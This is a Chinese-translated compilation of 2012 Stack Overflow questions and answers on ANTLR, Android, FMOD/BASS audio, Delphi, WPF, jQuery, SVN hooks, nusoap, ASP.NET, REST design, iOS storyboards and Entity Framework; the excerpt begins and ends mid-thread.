> 时间：2012-06-02T14:07:32.803

始终确保任何 AST 的根是单个（唯一）令牌（不是解析器规则），并且在重写单个解析器规则的情况下，不要这样做，`... -> ^(single_parser_rule)`而只需执行以下操作：`... -> single_parser_rule`

因此，在您的情况下，在`operand`规则中，更改`-> ^(expression)`为`-> expression`：

```
operand
    : literal 
    | functionExpr -> ^(CALL functionExpr)
    | percent
    | VARIABLE
    | LPAREN expression RPAREN -> expression
    ; 
```

# android - 从另一个活动中隐藏 TabHost

> ID：10862806
> 
> 赞同：1
> 
> 时间：2012-06-02T13:49:29.900
> 
> 标签：android, android-tabhost

我正在开发一个需要隐藏 TabHost 的应用程序。我需要删除它的原因是，当您打开键盘时，它“位于”键盘顶部。我已设法使用以下代码访问 TabHost：

```
TabSample activity = (TabSample) this.getParent();
    final TabHost tabhost = activity.getTabHost(); 
```

问题是当我尝试使用以下方法隐藏它时：

```
tabhost.setVisibility(View.INVISIBLE); 
```

它还使当前的活动不可见，因此您必须盲打。我需要找到一种方法使 TabHost 不可见，而不使当前的 Activity 不可见，或者使它们位于键盘“后面”。

TabHost 是库存。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-05T09:51:47.653

您是否尝试过使用

```
<activity android:name=".YourClass" android:windowSoftInputMode="adjustPan|adjustResize"></activity> 
```

在 AndroidManifest.xml 中

# c# - FMOD CreateSound 与用户创建的流

> ID：10862807
> 
> 赞同：0
> 
> 时间：2012-06-02T13:49:30.817
> 
> 标签：c#, fmod

给定一个应该在 C# 中播放 SNES SPC 文件和 FMOD 的 DLL，为什么这个调用会`system.createSound`失败？

```
var ret = system.init(32, FMOD.INITFLAGS.NORMAL, (IntPtr)null);
var soundEx = new FMOD.CREATESOUNDEXINFO()
{
    cbsize = Marshal.SizeOf(soundEx),
    fileoffset = 0,
    length = ~0U,
    numchannels = 2,
    defaultfrequency = 32000,
    format = FMOD.SOUND_FORMAT.PCM16,
    pcmreadcallback = pcmreadcallback,
    pcmsetposcallback = pcmsetposcallback,
    dlsname = null,
};
var mode = FMOD.MODE.DEFAULT | FMOD.MODE.OPENUSER
         | FMOD.MODE.LOOP_NORMAL | FMOD.MODE.CREATESTREAM;
ret = system.createSound((string)null, mode, ref soundEx, ref sound);
//^-- ERR_INVALID_PARAM
ret = system.playSound(FMOD.CHANNELINDEX.FREE, sound, false, ref channel); 
```

将其`usercreatedsound`与 FMOD 附带的示例进行比较：

```
FMOD.MODE mode = (FMOD.MODE._2D | FMOD.MODE.DEFAULT
               | FMOD.MODE.OPENUSER | FMOD.MODE.LOOP_NORMAL
               | FMOD.MODE.HARDWARE);
//snip
createsoundexinfo.cbsize            = Marshal.SizeOf(createsoundexinfo);
createsoundexinfo.fileoffset        = 0;
createsoundexinfo.length            = frequency * channels * 2 * 2;
createsoundexinfo.numchannels       = (int)channels;
createsoundexinfo.defaultfrequency  = (int)frequency;
createsoundexinfo.format            = FMOD.SOUND_FORMAT.PCM16;
createsoundexinfo.pcmreadcallback   = pcmreadcallback;
createsoundexinfo.pcmsetposcallback = pcmsetposcallback;
createsoundexinfo.dlsname           = null;
//snop
result = system.createSound(
    (string)null, 
    (mode | FMOD.MODE.CREATESTREAM), 
    ref createsoundexinfo,
    ref sound); 
```

长度，频率......无关紧要。

编辑：我已经确认 SPC 播放器可以正常工作，至少就初始化而言，并且 FMOD 附带的示例可以正常构建和运行。*除了调整设置以使其运行之外，唯一特别有意义的更改是以 4.0 风格编写。*

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-02T15:43:43.217

不一定在所有声卡上都可以播放任意采样率。32Khz 不是 44.1、48、96 等“常见”速率...

*   你试过 FMOD.MODE.SOFTWARE 吗？
*   您可能可以使用[ASIO4ALL](http://www.asio4all.com/)使用仲裁采样率，但您需要切换到 ASIO。

你绑定到 FMOD 了吗？如果没有，那么考虑[BASS.NET](http://www.un4seen.com/)，你将比 FMOD 拥有更多的控制权来做这些事情。

使用 BASSMix 的示例：请参阅下面的备注

```
using System;
using Un4seen.Bass;
using Un4seen.Bass.AddOn.Mix;

namespace XXX
{
    public class Resampler : IDisposable
    {
        private readonly int _channels;
        private readonly string _filename;
        private readonly int _samplerate;

        public Resampler(string filename, int samplerate, int channels)
        {
            if (filename == null) throw new ArgumentNullException("filename");
            if (samplerate <= 0) throw new ArgumentNullException("samplerate");
            if (channels <= 0) throw new ArgumentNullException("channels");

            #region Initialize BASS stuff

            #endregion

            _filename = filename;
            _samplerate = samplerate;
            _channels = channels;
        }

        #region IDisposable Members

        public void Dispose()
        {
            throw new NotImplementedException();
        }

        #endregion

        public void Resample(string filename)
        {
            if (filename == null) throw new ArgumentNullException("filename");
            Exceptions.ThrowIfPathInvalid(filename);

            #region Create stream and mixer

            int channel = Bass.BASS_StreamCreateFile(filename, 0, 0,
                                                     BASSFlag.BASS_STREAM_PRESCAN | BASSFlag.BASS_STREAM_DECODE |
                                                     BASSFlag.BASS_SAMPLE_FLOAT);
            if (channel == 0)
                throw new BassException("Couldn't create stream.");

            var mixer = BassMix.BASS_Mixer_StreamCreate(22050, 1, BASSFlag.BASS_STREAM_DECODE | BASSFlag.BASS_SAMPLE_FLOAT);
            if (mixer == 0)
                throw new BassException("Couldn't create mixer stream.");

            if (!BassMix.BASS_Mixer_StreamAddChannel(mixer, channel,
                                                     BASSFlag.BASS_MIXER_DOWNMIX | BASSFlag.BASS_MIXER_FILTER |
                                                     BASSFlag.BASS_MIXER_NORAMPIN))
                throw new BassException("Couldn't add stream channel to mixer.");

            #endregion

            int sr = 22050;
            int secs = 20;
            int samples0 = sr * secs;
            var buffer = new float[samples0];
            int length = sizeof(float) * buffer.Length;
            var getData = Bass.BASS_ChannelGetData(mixer, buffer, length | (int)BASSData.BASS_DATA_FLOAT);
            if (getData != length)
            {
                throw new BassException("");
            }
            var bassMixerChannelRemove = BassMix.BASS_Mixer_ChannelRemove(channel);
            var streamFree = Bass.BASS_StreamFree(channel);
            var bassStreamFree = Bass.BASS_StreamFree(mixer);
        }
    }
} 
```

（在 VS2010 中使用最新的低音）

一些额外的提示：

*   你必须先调用 BASS.Bass_Init，

*   不要忘记复制你的EXE旁边的bass.dll和bassmix.dll，

*   我个人会坚持使用 BASS_SAMPLE_FLOAT，即使您的源不是，最大的好处是您不会使用这种格式进行剪辑，我告诉您这是因为我为 NES 鸸鹋制作了一个音频包装器，其 APU 的输出相当“动态的”，它被证明是有帮助的。这也使事情变得更简单，质量最好。

*   在您的情况下，您希望使用推送流并将其与您的 SNES 输出一起提供：Bass..::..BASS_StreamCreatePush

*   创建一个“标准”混音器流（不是解码流），插入您的推送流，播放混音器

*   在示例中，它是一个解码流，因为我需要处理数据，而不是回放它。

*   BassException 只是我自己创建的，将其更改为您想要的任何内容

*   您最好的朋友将是 CHM 帮助文件，也是他们的论坛。

*   我建议你从这段代码开始，然后在你有任何问题时发布你的新代码。

不得不说，BASS 一开始是很难掌握的，但最后还是很有收获的。最近在学习 OpenGL 3.X 的时候也有同样的感觉；一开始我很难理解，但现在我可以做很多事情了。我会说 BASS 与 OpenGL 和 3D 一样。

抱歉，自从上次以来我病得很重，大部分时间都没有使用PC，但是我看到了您的消息，想尽快回复您，以便您继续前进。如果有人向 SO 抱怨我的答案布局：我稍后会修复它。

# android - 在android中显示来自服务器的表单

> ID：10862813
> 
> 赞同：1
> 
> 时间：2012-06-02T13:50:27.430
> 
> 标签：android, layout

我想在服务器中生成布局并让 android 应用程序将其显示给用户，我看到一个问题说我不能这样做，

有什么办法可以解决这种情况吗？

使用 html 表单并将它们加载到 web 视图中怎么样？

有什么办法可以做到这一点？

# delphi - 使用 Delphi 从所有窗口窗体中获取焦点控制

> ID：10862817
> 
> 赞同：0
> 
> 时间：2012-06-02T13:51:55.127
> 
> 标签：delphi, object, text, focus, controls

我有兴趣从 Delphi 中鼠标聚焦的所有控件中获取标题/标题/文本。

因此，在任何窗口的所有控件之后移动鼠标，我很感兴趣检索使用鼠标到达的当前对象标题。

示例：Windows 中的讲述人

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-02T15:22:26.367

您需要[GetCursorPos](http://msdn.microsoft.com/en-us/library/windows/desktop/ms648390%28v=vs.85%29.aspx)来获取屏幕上光标的坐标，然后使用[WindowFromPoint](http://msdn.microsoft.com/en-us/library/windows/desktop/ms633558%28v=vs.85%29.aspx)来获取该位置的窗口/控件的窗口句柄。获得窗口句柄后，您可以使用它通过 Win32 api 检索或更改窗口/控件的属性。

我发现这个例子向你展示了如何使用这种方法获取窗口/控件的类名：http: [//delphi.about.com/cs/adptips2000/a/bltip1200_2.htm](http://delphi.about.com/cs/adptips2000/a/bltip1200_2.htm)

# c# - 如何在运行时修改 WPF 中的 Grid RowDefinitions 和 ColumnDefinitions？

> ID：10862826
> 
> 赞同：0
> 
> 时间：2012-06-02T13:53:00.883
> 
> 标签：c#, wpf, xaml

我正在编写一个简单的益智游戏程序 - 除了一个单元格之外，所有单元格都充满了按钮，您必须通过使用唯一一个空单元格移动它们来正确排序它们。第一个版本是一个 3x3 网格，有 8 个按钮 + 一个不可见。但是，现在我想让用户更改行数和列数。我需要使用滑块来操纵高度和宽度。不幸的是，我不知道如何在运行时操纵网格。这是我目前所拥有的屏幕截图：![截屏](../Images/738bcb15916380d265214058aff73db9.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-02T14:09:38.047

除非 WPF 与 Silverlight 有很大不同，否则您不能仅以编程方式更改列/网格定义吗？

（只是警告，在记事本中写这个，因为我没有视觉工作室来检查，所以我只是凭记忆）

```
myGrid.Columns.Clear();
myGrid.Rows.Clear();

int buttonNumber = 0;
double buttonWidth = GridWidth / numberOfColumns;
double buttonHeight = GridHeight / numberOfRows;

for (int columnNumber = 0; columnNumber < numberOfColumns; columnNumber++)
{
    var column = new ColumnDefinition();
    myGrid.Columns.Add(column);

    for (int rowNumber = 0; rowNumber < numberOfRows; rowNumber++)
    {
        var row = new RowDefinition();
        myGrid.Rows.Add(row);

        var button = new Button();
        button.Content = ++buttonNumber;
        button.Width = buttonWidth;
        button.Height = buttonHeight;
        Grid.SetColumn(button, columnNumber);
        Grid.SetRow(button, rowNumber);
    }
} 
```

# javascript - 如何通过javascript使元素鼠标不可点击但可点击？

> ID：10862827
> 
> 赞同：3
> 
> 时间：2012-06-02T13:53:10.197
> 
> 标签：javascript, javascript-events, jquery

我在**jQuery**中使用翻转插件来翻转给定的 div。

代码（重用某人的代码）在您单击一个元素后翻转它。

我有几张图片，通过使用此功能，我正在尝试创建动画。我正在使用**jQuery**单击这些图像。然而问题是，即使用户可以单击图像并再次翻转我不想要的图像。

我尝试使用**CSS**属性：

```
 body{pointer-events:none;} 
```

这可行，但在我完成动画后我无法使用**jQuery禁用它。**我试过：

```
 $('body').css('pointer-events','normal'); 
```

我重用的代码是：

```
$(document).ready(function() { /* The following code is executed once the DOM is loaded */

    $('.sponsorFlip').bind("click", function() {

        // $(this) point to the clicked .sponsorFlip element (caching it in elem for speed):
        var elem = $(this);

        // data('flipped') is a flag we set when we flip the element:
        if (elem.data('flipped')) {
            // If the element has already been flipped, use the revertFlip method
            // defined by the plug-in to revert to the default state automatically:
            elem.revertFlip();

            // Unsetting the flag:
            elem.data('flipped', false)
        }
        else {
            // Using the flip method defined by the plugin:
            $(this).unbind("click");
            $(this).unbind("click");
            $(this).unbind("click");
            elem.flip({
                direction: 'lr',
                speed: 350,
                onBefore: function() {
                    // Insert the contents of the .sponsorData div (hidden from view with display:none)
                    // into the clicked .sponsorFlip div before the flipping animation starts:

                    elem.html(elem.siblings('.sponsorData').html());
                }
            });

            // Setting the flag:
            elem.data('flipped', true);

        }
    });

}); 
```

我尝试添加

```
 $('.sponsorFlip').unbind("click"); 
```

它也不起作用。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-02T13:56:49.103

```
$('.sponsorFlip').on('click', function(e) {
   // for a click event by mouse has e.clienX/e.clientY 
   if(e.clientX){
      // then click by mouse
   } else {
      // triggered 
   }
}); 
```

**[演示（见控制台）](http://jsfiddle.net/thecodeparadox/QStkd/111/)**

为您的代码

```
$('.sponsorFlip').bind('click', function(e) {
   // for a click event by mouse has e.clienX/e.clientY 
   if(e.clientX){
      // then click by mouse
   } else {
      // triggered 
   }
}); 
```

**[演示（见控制台）](http://jsfiddle.net/thecodeparadox/2gL2Q/)**

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-02T14:15:35.607

将其分配给点击事件，然后模拟点击，然后取消分配点击事件似乎有点hack。为什么不直接创建一个翻转元素的函数呢？

```
var options = {...};
$(element).flip(options); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-02T14:29:35.650

为了快速解决，只需尝试删除这些行：

```
 // If the element has already been flipped, use the revertFlip method
        // defined by the plug-in to revert to the default state automatically:
        elem.revertFlip();

        // Unsetting the flag:
        elem.data('flipped', false) 
```

# svn - 如何更新 SVN 旧的提交评论/日志消息？

> ID：10862830
> 
> 赞同：2
> 
> 时间：2012-06-02T13:53:27.633
> 
> 标签：svn, logging, edit

我正在使用 TortoiseSVN 并在尝试编辑我的旧帖子时出现错误，如下图所示。

我怎样才能让它可编辑？

![在此处输入图像描述](../Images/c771e33d1b420702e6eba0a6f206dc5a.png)

![在此处输入图像描述](../Images/d31deb0e38780575ff8b46ee99877abd.png)

![在此处输入图像描述](../Images/3335737e644de1f3e9297b449dfab0bc.png)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-03T14:13:06.960

您需要获取并安装**pre-revprop-change**挂钩脚本以覆盖不允许编辑日志消息的默认行为。

*获取***pre-revprop-change**挂钩脚本很简单：Windows 版本（来自 Philibert Perusse）可在 StackOverflow 帖子Common [Types of Subversion Hooks](https://stackoverflow.com/questions/6155/common-types-of-subversion-hooks/68850#68850)上找到。而且您的 Subversion 存储库 hooks 目录中已经有了 Unix/Linux 版本。（不过，对于即时可用的版本，请参阅[此 StackOverflow 帖子](https://stackoverflow.com/questions/692851/can-i-go-back-and-edit-comments-on-an-svn-checkin)。）

*安装*钩子脚本几乎同样简单。您必须有权访问您的存储库（或与您的系统管理员交谈）。然后只需将脚本复制到存储库中的 hooks 子目录中。该`hooks`目录预先填充了各种钩子的模板。这`pre-revprop-change.tmpl`是一个包含 Unix/Linux 版本的模板，以及 Windows 版本的说明。（如果您想了解更多关于这些钩子的信息，但无权访问存储库，只需创建自己的虚拟存储库（TortoiseSVN >> 在此处创建存储库）并查看`hooks`它生成的子文件夹。）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-02T13:59:48.617

直接来自[文档](http://tortoisesvn.net/docs/nightly/TortoiseSVN_en/tsvn-dug-showlog.html#tsvn-dug-showlog-4)：

> 有时您可能想要更改您曾经输入的日志消息，可能是因为其中存在拼写错误，或者您想要改进消息或出于其他原因更改它。或者您想更改提交的作者，因为您忘记设置身份验证或...
> 
> Subversion 允许您随时更改修订属性。但由于此类更改无法撤消（这些更改没有版本控制），默认情况下禁用此功能。要完成这项工作，您必须设置一个 pre-revprop-change 挂钩。有关如何执行此操作的详细信息，请参阅 Subversion Book 中有关 Hook 脚本的章节。阅读名为“服务器端钩子脚本”的部分，以找到有关在 Windows 机器上实现钩子的更多说明。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-03T17:40:47.413

附加到@msorens 答案，这是我在 Ubuntu 服务器中的说明。

在 your 下`repository folder`，有一个文件叫做`pre-revprop-change.tmpl` You need to clone it to a file `pre-revprop-change`， chmod a+x to it。然后它应该工作。

# php - 如何在nusoap中通过引用设置参数？

> ID：10862836
> 
> 赞同：4
> 
> 时间：2012-06-02T13:53:56.853
> 
> 标签：php, nusoap, ref

如何在 nusoap.xml 中通过 ref 设置参数。在下面的代码中，我应该通过 ref 设置两个参数（status 和 recId）。请注意，`&`不起作用：

```
 $params = array(
        'username' => GATEWAY_USERNAME,
        'password' => GATEWAY_PASSWORD,
        'from' => GATEWAY_NUMBER,
        'to' => array($to),
        'text' => $message,
        'flash' => $flash,
        'udh' => '',
        'status' => &$status,
        'recId' => &$recId
    );

    $sendParams=array($params);
    $res=$this->client->call('Send',$sendParams); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2015-04-04T00:55:14.593

**关于通过引用传递值：**

```
function test_reference_in(&$array) {
    $array['a'] = 2;
}

$test_array['a'] = 1;
test_reference_in($test_array);
echo $test_array; //-> it prints 2 
```

**关于 nusoap：**

现在在`nusoap`客户端类是`nusoap_client`.
在那节课上，你必须`nusoap_client::call()`打肥皂电话。

这就是您在示例中`nusoap_client::call()`的数组中发生的情况。 我将省略所有其他与更好地解释发生了什么无关的方法。`$params``$sendParams`
`$params`

```
/**
 * Pseudocode of call to explain the operations on $params
 * @see nusoap_client::call()
 */
function call($operation,$params=array(),$namespace='http://tempuri.org',$soapAction='',$headers=false,$rpcParams=null,$style='rpc',$use='encoded'){
    /*
       some code 
       .
       .
       .

     */
    // varDump is just var_dump so print $params 
    $this->appendDebug('params=' . $this->varDump($params));
     /*
       some code 
       .
       .
       .

     */ 

    /*
     * Here $params has been read, no write operation in there 
     * about serializeRPCParameters @see class.wsdl.php again is just reading
     */
    if (is_string($params)) {
        $this->debug("serializing param string for WSDL operation $operation");
        $payload = $params;
    } elseif (is_array($params)) {
        $this->debug("serializing param array for WSDL operation $operation");
        $payload = $this->wsdl->serializeRPCParameters($operation,'input',$params,$this->bindingType);
    } else {
        $this->debug('params must be array or string');
        $this->setError('params must be array or string');
        return false;
    }

    /*
     * Here again $params has been read, no write operation in there 
     */
    if (is_string($params)) {
        $this->debug("serializing param string for operation $operation");
        $payload = $params;
    } elseif (is_array($params)) {
        $this->debug("serializing param array for operation $operation");
        foreach($params as $k => $v){
            $payload .= $this->serialize_val($v,$k,false,false,false,false,$use);
        }
    } else {
        $this->debug('params must be array or string');
        $this->setError('params must be array or string');
        return false;
    }
} 
```

因此，正如您在此处看到的，通过引用传递 $params 没有任何优势。

因为：

1.  $params 在 nusoap_client::call() 中没有以任何方式修改
2.  即使您在必须再次使用 nusoap_client::call() 之后在其他地方修改 $params

**如果您想在任何情况下通过引用传递 $params 怎么办？我可以做吗？**

是的，你可以！
要实现这一点，您必须复制`nusoap_client.php`并调用它`nusoap_client_new.php`。
在那里将类名形式修改`nusoap_client`为`nusoap_client_new`.

```
// From this 
class nusoap_client extends nusoap_base  {

// To this 
class nusoap_client_new extends nusoap_base  { 
```

修改`nusoap_client_new::call()`在 params 中添加 ref 的方法，如下所示：

```
/*
 * Please note &$params=array() instead of $params=array()
 */
function call($operation,&$params = array(),$namespace='http://tempuri.org',$soapAction='',$headers=false,$rpcParams=null,$style='rpc',$use='encoded'){
    /**
     * Of course here you have to modify your code to make some operation on $params
     * according to your needs.
     */
     /*
       original code 
       .
       .
       .

     */ 
} 
```

最后将您的代码更新为 require 和 use`nusoap_client_new::call()`而不是`nusoap_client::call()`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-04-02T09:43:28.097

专为古斯塔沃而设。

从[PHP 5.4](http://php.net/manual/en/migration54.incompatible.php)版本开始：

> 调用时通过引用传递已被删除。

这意味着什么，在这样的版本`<= PHP 5.3`代码中应该可以工作：

```
function appendA($string) {
    $stringA .= 'A';
}

$string = '';
appendA(&$string); 
```

但以后不再工作。对于 PHP 5.4+ 来创建一个通过引用编辑其参数的函数，您必须从一开始就以这种方式声明它。例如：

```
function appendA(&$string) { // <- first change
    $stringA .= 'A';
}

$string = '';
appendA($string); // <- second change 
```

请注意，在 PHP 5.4+ 中，尝试调用函数`appendA(&$string)`会产生一个通知并且不会通过引用更改值。

根据原始问题，我还没有找到在 nusoap 函数中`$params`更改的地方`client::call()`，所以我认为通过引用提供它们没有意义，但我可能是盲目的。无论如何，方法未以与 PHP 5.4+ 兼容的方式声明，因此`&`方法调用期间的近参数不适用于那些 PHP 版本。在这种情况下需要修改方法。

# asp.net - asp.net下对象元素中的类

> ID：10862837
> 
> 赞同：4
> 
> 时间：2012-06-02T13:54:09.213
> 
> 标签：asp.net, visual-studio-2010, flash

我在我的网页设计 asp.net 中使用以下代码：

```
 <object id="ClockFrame01" class="System.Collections.ArrayList" width="70px" height="70px" type="application/x-shockwave-flash" runat="server" data="http://www.worldtimeserver.com/clocks/wtsclock001.swf?color=808000&wtsid=US-CA" >
         <param name="movie" value="http://www.worldtimeserver.com/clocks/wtsclock001.swf?color=808000&wtsid=US-CA" />
         <param name="FlashVars" value="playerMode=embedded" />
         <param name=" wmode" value="permanent" />
         <param name="ShowDisplay" value="true"/>
</object> 
```

替换产生错误的旧的：

```
<embed  src="http://www.worldtimeserver.com/clocks/wtsclock001.swf?color=808000&wtsid=US-CA" class="style_Clock" wmode="transparent" type="application/x-shockwave-flash" runat="server" /> 
```

但是在调试我的代码时；我的网站缺少时钟！！！
很明显，我的代码很糟糕，但我不知道该怎么做。

以下类以相同的方式工作：

```
class="System.Web.UI.HtmlControls.HtmlGenericControl" 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-03T08:02:27.290

我终于在我的代码中发现了错误的输入。正确的代码是：

```
<object id="ClockFrame01" class="System.Web.UI.HtmlControls.HtmlGenericControl" width="70px" height="70px" type="application/x-shockwave-flash" data="http://www.worldtimeserver.com/clocks/wtsclock001.swf?color=808000&wtsid=US-CA" >
    <param name="movie" value="http://www.worldtimeserver.com/clocks/wtsclock001.swf?color=808000&wtsid=US-CA" />
    <param name="FlashVars" value="playerMode=embedded" />
    <param name=" wmode" value="transparent" />
    <param name="ShowDisplay" value="true"/>
</object> 
```

错误是

> 运行=“服务器”

对象必须没有这个指令！！！

您还需要进行一些更改：

> &wtsid

需要改变

```
&amp;wtsid 
```

# php - 是否需要使用 RESTful Api 作为自定义 Web 应用后端？

> ID：10862839
> 
> 赞同：0
> 
> 时间：2012-06-02T13:54:12.493
> 
> 标签：php, ajax, rest

我目前正在开发一个将使用大量 ajax 进行数据检索的 Web 应用程序。只有在用户通过身份验证后，才能访问数据的某些部分。我希望将来有一个易于使用的 API 用于其他应用程序，但目前 API 的唯一用途是驱动 Web 应用程序。

与更定制的传统 API 相比，我实现 REST API 是否值得？

我已经研究过使用休息，到目前为止，我发现了以下内容

*   由于服务器不存储状态，用户身份验证会更加困难
*   api 将无法在同一个请求中提供多个数据项，从而导致更大的开销
*   Rest api 将具有更大的可扩展性

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-02T14:18:50.063

好吧，你已经给出了我能想到的 3 个最好的理由来回答你的问题。它归结为只有你才能对这些问题给出的答案。

我的方法是在我们的每个客户站点中为“他们的”东西提供一个“迷你”API，而我们的“主”API 则成为超越“只是他们的”的通用或重要功能的存储库。它们都建立在相同的基础上，因此可以根据需要轻松切换和交换它们。

此外，通过将结果编码为 json，我们能够在一次调用中返回很多很多数据项（如果需要，可以同时返回整个表的列）。如果您想看看他们是谁做的，我建议您查看[Luracast 的 ReSTLER](http://luracast.com/products/restler/) - 这是一个不错的起点。

**编辑**显示*非常*简单的多值返回：

```
if(is_array($result)) {
    echo json_encode(array_values($result));
}else{
    echo json_encode($result);
} 
```

使用 Luracast ReSTLer，此代码将在一次调用中返回 PHPInfo 包含的所有内容：

```
 ob_start();
    phpinfo($module);
    $info_arr = array();
    $info_lines = explode("\n", strip_tags(ob_get_clean(), "<tr><td><h2>"));
    $cat = "General";
    foreach($info_lines as $line)
    {
        preg_match("~<h2>(.*)</h2>~", $line, $title) ? $cat = $title[1] : null;
        if(preg_match("~<tr><td[^>]+>([^<]*)</td><td[^>]+>([^<]*)</td></tr>~", $line, $val))
        {
            $info_arr[$cat][$val[1]] = $val[2];
        }
        elseif(preg_match("~<tr><td[^>]+>([^<]*)</td><td[^>]+>([^<]*)</td><td[^>]+>([^<]*)</td></tr>~", $line, $val))
        {
            $info_arr[$cat][$val[1]] = array("local" => $val[2], "master" => $val[3]);
        }
    }
    return Utilities::arrayToObject($info_arr); 
```

# iphone - 如何使用情节提要从 Masterview 推送到详细视图？

> ID：10862843
> 
> 赞同：0
> 
> 时间：2012-06-02T13:54:33.143
> 
> 标签：iphone, ios, xcode, uistoryboard

我试图推到情节提要中的详细视图，但不工作。

```
-(void)prepareForSegue:(UIStoryboardSegue *)segue sender:(id)sender
{
    if ([[segue identifier] isEqualToString:@"drinkList"])
    {
        NSIndexPath *myIndexPath = [self.drinksCatTable indexPathForSelectedRow];

        if (myIndexPath.row ==0) //if selected is row 1 
        {
            selectedDrinkCat  =[segue destinationViewController];
            Drinks *drinkList = [aDelegate.categoryArray objectAtIndex:0];//forward all drinks to drinksList
            selectedDrinkCat.drinkList = drinkList;//point drinkList to the next view drinkList
            selectedDrinkCat.allDrinkStr = @"All";//all drinks selected 
                 NSLog(@"aaa");
        }
        else 
        {
            Drinks *drinkList = [aDelegate.categoryArray objectAtIndex:(myIndexPath.row)-1];//we have to minus 1 as the row had en extra "All" row which is not in the database
            selectedDrinkCat.drinkList = drinkList; 
            selectedDrinkCat.allDrinkStr =@"cat";
            NSLog(@"1111");

        }
    }
}

- (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath {

    [self performSegueWithIdentifier:@"drinkList" sender:self];
    NSLog(@"called did select");   

} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-02T15:16:27.837

你不应该声明`selectedDrinkCat`为`viewcontroller`的类`destinationViewController`吗？

就像是：

```
desmondViewController *selectedDrinkCat=(desmondViewController *)[segue destinationViewController]; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-02T13:56:12.973

您必须使用视图控制器的`pushViewController:`方法。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-02T14:09:58.747

请执行下列操作：

*   转到`storyboard`文件
*   单击`viewcontroller1`然后按主视图控制器（鼠标+ ^）并将其拖动到`viewController2`
*   从上下文菜单中选择推送
*   将在这些视图之间创建一个链接，单击它并在检查器中更改`Indetifier`为`drinkList`

这设置了故事板

现在您编写的代码应该可以工作了。

# android - 如何从 Date 对象设置 Android Chronometer 基准时间？

> ID：10862845
> 
> 赞同：11
> 
> 时间：2012-06-02T13:54:39.040
> 
> 标签：android, chronometer

我从特定时间开始计时表时遇到问题。我希望我的计时器从一个 Date 对象开始：

```
Date d = new Date(); //now, just for example
chronometer.setBase(d.getTime()); //long value of d
Log.d("Date: " , "d.getTime() time is [" + d.getTime() +"]");
Log.d("Chron: " , "chronometer.getBase() is [" + chronometer.getBase() +"]");
//let's print out elapsedRealtime from official sample
Log.d("Chron: " , "SystemClock.elapsedRealtime() is [" + SystemClock.elapsedRealtime() +"]"); 
```

输出：

```
06-02 13:35:23.025: D/Date:(928): d.getTime() time is [1338644123032]
06-02 13:35:23.037: D/Chron:(928): chronometer.getBase() is [1338644123032]
06-02 13:35:23.037: D/Chron:(928): SystemClock.elapsedRealtime() is [11624388] 
```

实际上，为什么这么长的时间值不同（11624388 和 1338644123032）？

当我从底座启动我的计时器时

```
chronometer.setBase(SystemClock.elapsedRealtime()); 
```

- 它总是工作正常（“00:00”和上升）

但是当我尝试从过去的日期（昨天）设置日期时：

```
chronometer.setBase(yesterday.getTime()); 
```

- 它显示“00:0(”并每秒将最新的字符更改为“)”、“*”、“/”等

您能否建议我如何将计时器底座设置为 Date 对象？

* * *

## 回答 #1

> 赞同：33
> 
> 时间：2013-11-04T18:20:38.190

我实际上有一个类似的问题（日期来自外部服务，而不是数据库），我想显示日期有多早。

事实证明很简单：

```
long lastSuccess = serviceDate.getTime(); //Some Date object
long elapsedRealtimeOffset = System.currentTimeMillis() - SystemClock.elapsedRealtime();
pollAgeView.setBase(lastSuccess - elapsedRealtimeOffset);
pollAgeView.start(); 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-06-02T14:05:30.197

> 实际上，为什么这么长的时间值不同（11624388 和 1338644123032）？

`SystemClock.elapsedRealtime()`是自设备开启以来的毫秒数。其他值基于`System.currentTimeMillis()`Unix 纪元以来的毫秒数。

> 您能否建议我如何将计时器底座设置为 Date 对象？

你没有。那不是`Chronometer`目的。引用[文档`Chronometer`](http://developer.android.com/reference/android/widget/Chronometer.html)：

> 你可以在 elapsedRealtime() 时基中给它一个开始时间，它会从那个开始计数，或者如果你不给它一个基准时间，它将使用你调用 start() 的时间。

# entity-framework-4 - 实体框架：OnModelCreating 的多个页面

> ID：10862846
> 
> 赞同：1
> 
> 时间：2012-06-02T13:54:52.300
> 
> 标签：entity-framework-4

我的项目变得相当大，我的流利的 api 也很广泛。

有没有办法可以将流利的 api 关注点分离到多个文件并在我的 OnModelCreating 中引用它们？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-02T14:44:11.467

解决方案的链接不是很具体，所以在这里详细说明：

```
[Context file]
protected override void OnModelCreating(DbModelBuilder modelBuilder)
{
modelBuilder.Configurations.Add(new Configurations.DataContext.EmployeeConfiguration(modelBuilder));
....
}

[Configuration file]
public class EmployeeConfiguration : EntityTypeConfiguration<Employee>
{
public EmployeeConfiguration(DbModelBuilder modelBuilder)
{ ...  }
....
} 
```

1.  需要注意的一点是：在配置中创建构造函数时，包含modelBuilder参数。

2.  在 OnModelcreating 中添加配置时，一定要传递 modelBuilder 参数。

# php - 简化 PHP 站点语言更改脚本

> ID：10862850
> 
> 赞同：0
> 
> 时间：2012-06-02T13:55:14.860
> 
> 标签：php, html

我有一个 PHP 脚本，允许用户更改我的网站显示的语言。我的脚本查看他们的浏览器语言，如果该网站以他们的语言可用，它会显示它，但如果它不能以他们的默认语言使用它用英文显示。此外，如果他们选择使用我们的 cookie 设置他们的语言，脚本会检查 cookie 定义的语言是否也可用。

但是，**这个脚本目前对我来说看起来有点冗长。有什么方法可以在保持相同功能的同时简化它？**

```
